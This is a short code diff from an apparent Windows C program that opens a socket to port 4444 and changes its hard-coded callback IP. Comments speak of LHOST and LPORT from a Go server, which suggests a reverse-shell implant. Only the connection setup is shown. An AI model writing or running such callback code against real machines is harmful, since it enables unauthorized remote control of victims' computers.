@@ -40,7 +40,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     // Define the server address (change this to the server's IP and port)
     server.sin_family = AF_INET;
     server.sin_port = htons(4444);  // Use the same LPORT as in Go server
-    server.sin_addr.s_addr = inet_addr("10.0.135.10");  // Use the LHOST from Go server
+    server.sin_addr.s_addr = inet_addr("10.0.1.35");  // Use the LHOST from Go server
 
     // Connect to the server
     if (connect(s, (struct sockaddr*)&server, sizeof(server)) < 0) {
